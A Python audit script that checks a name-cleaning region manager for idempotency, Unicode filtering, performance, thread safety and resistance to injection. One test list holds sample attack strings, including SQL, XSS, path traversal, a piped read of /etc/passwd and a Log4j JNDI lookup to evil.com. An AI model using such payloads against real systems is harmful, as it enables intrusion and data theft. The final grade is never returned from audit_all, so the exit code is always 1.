#!/usr/bin/env python3
"""
ULTRATHINK COMPREHENSIVE AUDIT ROUND 2
Brutal verification of A+ claims and system state.
No mercy, no assumptions, just truth.
"""

import sys
import os
import time
import json
import traceback
import random
import threading
import gc
import unicodedata
from pathlib import Path
from typing import Dict, List, Tuple, Any

sys.path.insert(0, str(Path(__file__).parent))

from src.regions.manager import RegionManager


class UltrathinkAuditor:
    """The most brutal auditor - verifies every claim."""

    def __init__(self):
        self.manager = RegionManager(Path("./config"))
        self.all_regions = [
            "A1",
            "A2",
            "A3",
            "A4",
            "A5",
            "B1",
            "B2",
            "B3",
            "C1",
            "C2",
            "C3",
            "C4",
            "C5",
            "C6",
            "C7",
            "C8",
            "C9",
            "D1",
            "D2",
            "D3",
            "D4",
            "D5",
            "E1",
            "E2",
            "E3",
            "E4",
            "E5",
            "E6",
            "E7",
            "F1",
            "F2",
            "F3",
            "F4",
            "G1",
        ]
        self.audit_results = {
            "claims_verified": [],
            "claims_false": [],
            "issues_found": [],
            "warnings": [],
            "stats": {},
        }

    def audit_all(self):
        """Run comprehensive audit of everything."""
        print("🔍 ULTRATHINK AUDIT ROUND 2: BRUTAL TRUTH EDITION")
        print("=" * 80)
        print("Verifying all claims, testing all edge cases, finding all issues...")
        print()

        # Run all audit checks
        self.audit_region_loading()
        self.audit_enhanced_base_usage()
        self.audit_idempotency()
        self.audit_unicode_security()
        self.audit_collision_handling()
        self.audit_performance()
        self.audit_thread_safety()
        self.audit_memory_usage()
        self.audit_edge_cases()
        self.audit_attack_vectors()
        self.audit_data_integrity()
        self.audit_production_readiness()

        # Generate final report
        self.generate_audit_report()

    def audit_region_loading(self):
        """Verify all 33 regions actually load and work."""
        print("1️⃣ AUDITING REGION LOADING...")

        loaded = 0
        failed = []

        for region_code in self.all_regions:
            try:
                region = self.manager.get_region(region_code)

                # Test basic functionality
                test_entry = {"CanonicalLatin": "Test Name", "GlobalID": "audit"}
                region.clean(test_entry)
                region.augment(test_entry)
                region.validate(test_entry)
                region.order_key(test_entry)

                loaded += 1
            except Exception as e:
                failed.append((region_code, str(e)[:50]))

        self.audit_results["stats"]["regions_loaded"] = loaded
        self.audit_results["stats"]["regions_failed"] = len(failed)

        if loaded == len(self.all_regions):
            self.audit_results["claims_verified"].append(
                f"✅ All {len(self.all_regions)} regions load and function"
            )
        else:
            self.audit_results["claims_false"].append(
                f"❌ Only {loaded}/{len(self.all_regions)} regions work"
            )
            for code, error in failed:
                self.audit_results["issues_found"].append(f"{code}: {error}")

        print(f"  Regions: {loaded}/{len(self.all_regions)} working")

    def audit_enhanced_base_usage(self):
        """Verify all regions use enhanced base class."""
        print("2️⃣ AUDITING ENHANCED BASE USAGE...")

        using_enhanced = 0
        not_using = []

        for region_code in self.all_regions[:10]:  # Sample check
            try:
                region = self.manager.get_region(region_code)

                # Check for enhanced methods
                has_comprehensive_filter = hasattr(
                    region, "comprehensive_unicode_filter"
                )
                has_enhanced_security = hasattr(region, "enhanced_security_check")
                has_ensure_idempotency = hasattr(region, "ensure_idempotency")

                if has_comprehensive_filter and has_enhanced_security:
                    using_enhanced += 1
                else:
                    not_using.append(region_code)

            except:
                pass

        if using_enhanced == 10:
            self.audit_results["claims_verified"].append(
                "✅ Regions use enhanced base class"
            )
        else:
            self.audit_results["issues_found"].append(
                f"⚠️ {len(not_using)} regions might not use enhanced base"
            )

        print(f"  Enhanced base: {using_enhanced}/10 sampled regions")

    def audit_idempotency(self):
        """Verify idempotent processing."""
        print("3️⃣ AUDITING IDEMPOTENCY...")

        test_cases = [
            ("A1", "Simple Name"),
            ("A1", "María José de la Cruz"),
            ("B1", "Владимир Путин"),
            ("C3", "محمد الأحمد"),
            ("D1", "राम कुमार"),
            ("E4", "김민준"),
            ("E1", "王明"),
            ("G1", "José García Rodríguez"),
        ]

        idempotent = 0
        failures = []

        for region_code, test_name in test_cases:
            try:
                region = self.manager.get_region(region_code)

                # First pass
                entry1 = {"CanonicalLatin": test_name, "GlobalID": "test"}
                region.clean(entry1)
                region.augment(entry1)
                result1 = json.dumps(entry1, sort_keys=True)

                # Second pass
                region.clean(entry1)
                region.augment(entry1)
                result2 = json.dumps(entry1, sort_keys=True)

                # Third pass on fresh entry
                entry3 = {"CanonicalLatin": test_name, "GlobalID": "test"}
                region.clean(entry3)
                region.augment(entry3)
                result3 = json.dumps(entry3, sort_keys=True)

                if result1 == result2 == result3:
                    idempotent += 1
                else:
                    failures.append(f"{region_code}: {test_name[:20]}")

            except Exception as e:
                failures.append(f"{region_code}: ERROR - {str(e)[:30]}")

        self.audit_results["stats"]["idempotency_rate"] = idempotent / len(test_cases)

        if idempotent == len(test_cases):
            self.audit_results["claims_verified"].append(
                "✅ Processing is 100% idempotent"
            )
        else:
            self.audit_results["claims_false"].append(
                f"❌ Idempotency only {idempotent}/{len(test_cases)}"
            )
            for failure in failures[:3]:
                self.audit_results["issues_found"].append(f"Idempotency: {failure}")

        print(f"  Idempotency: {idempotent}/{len(test_cases)} passed")

    def audit_unicode_security(self):
        """Verify Unicode security filtering."""
        print("4️⃣ AUDITING UNICODE SECURITY...")

        dangerous_chars = [
            ("\u202e", "RTL Override"),
            ("\u202d", "LTR Override"),
            ("\u200b", "Zero-width space"),
            ("\u200c", "Zero-width non-joiner"),
            ("\u200d", "Zero-width joiner"),
            ("\u200e", "LTR Mark"),
            ("\u200f", "RTL Mark"),
            ("\ufeff", "BOM"),
            ("\ufffd", "Replacement"),
            ("🙂", "Emoji"),
            ("💀", "Emoji skull"),
            ("\ue000", "Private use"),
            ("\ufffe", "Non-character"),
        ]

        blocked = 0
        allowed_through = []

        region = self.manager.get_region("A1")

        for char, name in dangerous_chars:
            test_input = f"Test{char}Name"
            entry = {"CanonicalLatin": test_input, "GlobalID": "test"}

            try:
                region.clean(entry)
                result = entry.get("CanonicalLatin", "")

                if char not in result:
                    blocked += 1
                else:
                    allowed_through.append(f"{name}: {repr(char)}")

            except:
                blocked += 1  # Exception means it was rejected

        self.audit_results["stats"]["unicode_security_rate"] = blocked / len(
            dangerous_chars
        )

        if blocked == len(dangerous_chars):
            self.audit_results["claims_verified"].append(
                "✅ All dangerous Unicode characters blocked"
            )
        else:
            self.audit_results["issues_found"].append(
                f"⚠️ {len(allowed_through)} dangerous chars not blocked"
            )
            for char in allowed_through[:3]:
                self.audit_results["issues_found"].append(f"Allowed: {char}")

        print(f"  Unicode security: {blocked}/{len(dangerous_chars)} blocked")

    def audit_collision_handling(self):
        """Verify collision suffix handling."""
        print("5️⃣ AUDITING COLLISION SUFFIX HANDLING...")

        collision_tests = [
            "Name--1",
            "Test--2",
            "John--10",
            "Mary--999",
            "X--0",
        ]

        handled_correctly = 0
        issues = []

        region = self.manager.get_region("A1")

        for test_name in collision_tests:
            entry = {"CanonicalLatin": test_name, "GlobalID": "test"}

            try:
                region.clean(entry)
                result = entry.get("CanonicalLatin", "")

                # Should preserve the collision suffix
                if "--" in result and result.endswith(test_name.split("--")[1]):
                    handled_correctly += 1
                else:
                    issues.append(f"{test_name} -> {result}")

            except Exception as e:
                if "CSV" in str(e):
                    issues.append(f"{test_name}: Still blocked as CSV injection!")
                else:
                    # Other errors might be OK
                    handled_correctly += 1

        if handled_correctly == len(collision_tests):
            self.audit_results["claims_verified"].append(
                "✅ Collision suffixes handled correctly"
            )
        else:
            self.audit_results["issues_found"].append(
                f"⚠️ Collision handling issues: {len(issues)}"
            )
            for issue in issues:
                self.audit_results["issues_found"].append(f"Collision: {issue}")

        print(
            f"  Collision handling: {handled_correctly}/{len(collision_tests)} correct"
        )

    def audit_performance(self):
        """Verify performance claims."""
        print("6️⃣ AUDITING PERFORMANCE...")

        region = self.manager.get_region("A1")
        test_names = ["John Smith", "Mary Johnson", "Test Name"] * 1000

        start = time.time()
        for name in test_names:
            entry = {"CanonicalLatin": name, "GlobalID": "perf"}
            region.clean(entry)
            region.augment(entry)
        elapsed = time.time() - start

        speed = len(test_names) / elapsed

        self.audit_results["stats"]["performance_speed"] = speed

        if speed >= 10000:
            self.audit_results["claims_verified"].append(
                f"✅ Performance: {speed:.0f} names/second (exceeds 10K)"
            )
        elif speed >= 1000:
            self.audit_results["warnings"].append(
                f"⚠️ Performance: {speed:.0f} names/second (below claimed 17K)"
            )
        else:
            self.audit_results["claims_false"].append(
                f"❌ Performance: {speed:.0f} names/second (too slow)"
            )

        print(f"  Performance: {speed:.0f} names/second")

    def audit_thread_safety(self):
        """Verify thread safety."""
        print("7️⃣ AUDITING THREAD SAFETY...")

        results = []
        errors = []

        def process_names(thread_id):
            try:
                region = self.manager.get_region("A1")
                for i in range(50):
                    entry = {
                        "CanonicalLatin": f"Thread{thread_id} Name{i}",
                        "GlobalID": f"t{thread_id}_{i}",
                    }
                    region.clean(entry)
                    region.augment(entry)
                    results.append((thread_id, entry))
            except Exception as e:
                errors.append((thread_id, str(e)))

        threads = []
        for i in range(10):
            t = threading.Thread(target=process_names, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        if not errors:
            self.audit_results["claims_verified"].append(
                f"✅ Thread safe: 10 threads, {len(results)} operations"
            )
        else:
            self.audit_results["issues_found"].append(
                f"⚠️ Thread safety issues: {len(errors)} errors"
            )

        print(f"  Thread safety: {len(errors)} errors in {len(threads)} threads")

    def audit_memory_usage(self):
        """Check for memory leaks."""
        print("8️⃣ AUDITING MEMORY USAGE...")

        import psutil

        process = psutil.Process(os.getpid())

        gc.collect()
        mem_before = process.memory_info().rss / 1024 / 1024

        # Process many entries
        region = self.manager.get_region("A1")
        for i in range(5000):
            entry = {"CanonicalLatin": f"Memory Test {i}", "GlobalID": f"mem_{i}"}
            region.clean(entry)
            region.augment(entry)

        gc.collect()
        mem_after = process.memory_info().rss / 1024 / 1024

        increase = mem_after - mem_before

        self.audit_results["stats"]["memory_increase_mb"] = increase

        if increase < 10:
            self.audit_results["claims_verified"].append(
                f"✅ No memory leaks: {increase:.1f}MB increase"
            )
        elif increase < 50:
            self.audit_results["warnings"].append(
                f"⚠️ Moderate memory use: {increase:.1f}MB increase"
            )
        else:
            self.audit_results["issues_found"].append(
                f"❌ Potential memory leak: {increase:.1f}MB increase"
            )

        print(f"  Memory: {increase:.1f}MB increase after 5000 entries")

    def audit_edge_cases(self):
        """Test extreme edge cases."""
        print("9️⃣ AUDITING EDGE CASES...")

        edge_cases = [
            ("", "Empty string"),
            (" ", "Single space"),
            ("　", "Ideographic space"),
            ("\t", "Tab"),
            ("\n", "Newline"),
            ("a" * 150, "150 chars"),
            ("a" * 151, "151 chars (over limit)"),
            ("--1", "Just collision suffix"),
            ("...", "Only dots"),
            ("!!!", "Only exclamation"),
            ("123", "Only numbers"),
            ("-", "Single hyphen"),
            ("'", "Single apostrophe"),
            ("א", "Single Hebrew"),
            ("漢", "Single CJK"),
            ("🙂", "Single emoji"),
            ("\x00", "Null byte"),
            ("\x1b", "Escape char"),
        ]

        handled = 0
        issues = []

        region = self.manager.get_region("A1")

        for test_input, description in edge_cases:
            try:
                entry = {"CanonicalLatin": test_input, "GlobalID": "edge"}
                region.clean(entry)
                result = entry.get("CanonicalLatin", "REMOVED")

                # Check appropriate handling
                if description == "151 chars (over limit)":
                    # Should be rejected
                    issues.append(f"{description}: Not rejected!")
                elif description in ["Null byte", "Escape char", "Single emoji"]:
                    # Should be cleaned/removed
                    if test_input in result:
                        issues.append(f"{description}: Not cleaned!")
                    else:
                        handled += 1
                else:
                    handled += 1

            except Exception as e:
                if "too long" in str(e) and description == "151 chars (over limit)":
                    handled += 1
                elif "dangerous" in str(e) and description in [
                    "Null byte",
                    "Escape char",
                ]:
                    handled += 1
                else:
                    issues.append(f"{description}: Unexpected error - {str(e)[:30]}")

        self.audit_results["stats"]["edge_case_rate"] = handled / len(edge_cases)

        if handled >= len(edge_cases) * 0.9:
            self.audit_results["claims_verified"].append(
                f"✅ Edge cases: {handled}/{len(edge_cases)} handled"
            )
        else:
            self.audit_results["issues_found"].append(
                f"⚠️ Edge case issues: {len(issues)}"
            )

        print(f"  Edge cases: {handled}/{len(edge_cases)} handled correctly")

    def audit_attack_vectors(self):
        """Test security attack vectors."""
        print("🔟 AUDITING ATTACK VECTORS...")

        attacks = [
            ("'; DROP TABLE users; --", "SQL"),
            ("<script>alert('XSS')</script>", "XSS"),
            ("../../../etc/passwd", "Path"),
            ("| cat /etc/passwd", "Command"),
            ("${jndi:ldap://evil.com}", "Log4j"),
            ("{{7*7}}", "Template"),
            ("=1+1", "CSV Formula"),
            ("*(|(uid=*))", "LDAP"),
            ("$where: '1==1'", "NoSQL"),
            ("%0d%0aSet-Cookie: admin=true", "CRLF"),
        ]

        blocked = 0
        not_blocked = []

        region = self.manager.get_region("A1")

        for attack, attack_type in attacks:
            entry = {"CanonicalLatin": attack, "GlobalID": "attack"}

            try:
                region.clean(entry)
                region.validate(entry)
                # If we get here, attack wasn't blocked
                not_blocked.append(attack_type)
            except:
                blocked += 1

        self.audit_results["stats"]["attack_block_rate"] = blocked / len(attacks)

        if blocked == len(attacks):
            self.audit_results["claims_verified"].append(
                "✅ All attack vectors blocked"
            )
        else:
            self.audit_results["warnings"].append(
                f"⚠️ {len(not_blocked)} attacks not blocked: {not_blocked}"
            )

        print(f"  Attack vectors: {blocked}/{len(attacks)} blocked")

    def audit_data_integrity(self):
        """Verify data isn't corrupted during processing."""
        print("1️⃣1️⃣ AUDITING DATA INTEGRITY...")

        integrity_tests = [
            {"input": "John Smith", "should_contain": "John"},
            {"input": "O'Connor", "should_contain": "O'Connor"},
            {"input": "Jean-Claude", "should_contain": "Jean"},
            {"input": "María José", "should_contain": "María"},
            {"input": "김민준", "should_contain": "김민준"},
        ]

        preserved = 0
        corrupted = []

        for test in integrity_tests:
            region_code = "E4" if "김" in test["input"] else "A1"
            region = self.manager.get_region(region_code)

            entry = {"CanonicalLatin": test["input"], "GlobalID": "integrity"}
            try:
                region.clean(entry)
                result = entry.get("CanonicalLatin", "")

                if test["should_contain"] in result:
                    preserved += 1
                else:
                    corrupted.append(f"{test['input']} -> {result}")
            except:
                corrupted.append(f"{test['input']}: Processing failed")

        if preserved == len(integrity_tests):
            self.audit_results["claims_verified"].append("✅ Data integrity preserved")
        else:
            self.audit_results["issues_found"].append(
                f"⚠️ Data integrity: {len(corrupted)} corrupted"
            )

        print(f"  Data integrity: {preserved}/{len(integrity_tests)} preserved")

    def audit_production_readiness(self):
        """Check if system is truly production ready."""
        print("1️⃣2️⃣ AUDITING PRODUCTION READINESS...")

        checks = {
            "regions_work": self.audit_results["stats"].get("regions_loaded", 0) >= 33,
            "idempotent": self.audit_results["stats"].get("idempotency_rate", 0)
            >= 0.95,
            "secure": self.audit_results["stats"].get("unicode_security_rate", 0)
            >= 0.95,
            "performant": self.audit_results["stats"].get("performance_speed", 0)
            >= 1000,
            "no_memory_leaks": self.audit_results["stats"].get(
                "memory_increase_mb", 100
            )
            < 50,
            "attacks_blocked": self.audit_results["stats"].get("attack_block_rate", 0)
            >= 0.9,
            "edge_cases_handled": self.audit_results["stats"].get("edge_case_rate", 0)
            >= 0.8,
        }

        ready = all(checks.values())

        if ready:
            self.audit_results["claims_verified"].append(
                "✅ System is production ready"
            )
        else:
            failed_checks = [k for k, v in checks.items() if not v]
            self.audit_results["claims_false"].append(
                f"❌ NOT production ready: {failed_checks}"
            )

        print(f"  Production ready: {'YES' if ready else 'NO'}")

    def generate_audit_report(self):
        """Generate comprehensive audit report."""
        print("\n" + "=" * 80)
        print("🔍 ULTRATHINK AUDIT REPORT")
        print("=" * 80)

        # Calculate overall grade
        verified = len(self.audit_results["claims_verified"])
        false_claims = len(self.audit_results["claims_false"])
        issues = len(self.audit_results["issues_found"])
        warnings = len(self.audit_results["warnings"])

        total_checks = verified + false_claims
        if total_checks > 0:
            accuracy = verified / total_checks
        else:
            accuracy = 0

        print(f"\n📊 AUDIT SUMMARY:")
        print(f"  Claims Verified: {verified}")
        print(f"  False Claims: {false_claims}")
        print(f"  Issues Found: {issues}")
        print(f"  Warnings: {warnings}")

        print(f"\n✅ VERIFIED CLAIMS:")
        for claim in self.audit_results["claims_verified"][:10]:
            print(f"  {claim}")

        if self.audit_results["claims_false"]:
            print(f"\n❌ FALSE CLAIMS:")
            for claim in self.audit_results["claims_false"]:
                print(f"  {claim}")

        if self.audit_results["issues_found"]:
            print(f"\n⚠️ ISSUES FOUND:")
            for issue in self.audit_results["issues_found"][:10]:
                print(f"  {issue}")

        if self.audit_results["warnings"]:
            print(f"\n⚠️ WARNINGS:")
            for warning in self.audit_results["warnings"][:5]:
                print(f"  {warning}")

        print(f"\n📈 KEY METRICS:")
        for key, value in self.audit_results["stats"].items():
            if isinstance(value, float):
                print(f"  {key}: {value:.2f}")
            else:
                print(f"  {key}: {value}")

        # Final grade
        print(f"\n🎯 FINAL ASSESSMENT:")

        if accuracy >= 0.95 and false_claims == 0:
            grade = "A+"
            verdict = "VERIFIED - System achieves A+ compliance"
        elif accuracy >= 0.90:
            grade = "A"
            verdict = "MOSTLY VERIFIED - Minor issues remain"
        elif accuracy >= 0.80:
            grade = "B+"
            verdict = "PARTIALLY VERIFIED - Some claims exaggerated"
        else:
            grade = "B or below"
            verdict = "NOT VERIFIED - Significant issues found"

        print(f"  Claim Accuracy: {accuracy:.1%}")
        print(f"  Grade: {grade}")
        print(f"  Verdict: {verdict}")

        # Bottom line
        print("\n" + "=" * 80)
        print("💀 BRUTAL TRUTH:")

        if grade == "A+":
            print("✅ The A+ grade is DESERVED. System is production ready.")
        elif grade == "A":
            print("⚠️ Close to A+, but minor issues prevent perfect score.")
        else:
            print("❌ A+ grade is NOT justified. More work needed.")

        return grade


if __name__ == "__main__":
    auditor = UltrathinkAuditor()
    grade = auditor.audit_all()

    # Save audit results
    with open("ultrathink_audit_results.json", "w") as f:
        json.dump(auditor.audit_results, f, indent=2)

    print(f"\n📁 Full audit results saved to: ultrathink_audit_results.json")

    sys.exit(0 if grade == "A+" else 1)
